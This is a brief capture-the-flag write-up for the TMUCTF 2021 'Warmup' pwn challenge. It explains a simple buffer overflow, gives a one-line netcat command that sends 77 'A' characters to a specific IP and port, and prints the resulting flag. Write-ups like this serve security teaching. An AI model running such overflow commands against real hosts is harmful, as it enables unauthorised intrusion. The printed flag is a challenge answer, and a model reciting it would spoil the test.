# Challenge Description
<p align="center">
  <img src="https://github.com/TMUCTF/TMUCTF-2021/blob/main/Pwn/Warmup/challenge.png">
</p>
<br>

# Writeup
This challenge was a simple overflow. You just had to give 77 or more chars as input in order to overwrite the variable inside the code and get the flag!  
```bash
python2.7 -c "print 'A'*77" | nc 194.5.207.56 7000
```   
The flag:   
```
TMUCTF{n0w_y0u_4r3_w4rm3d_up}
```
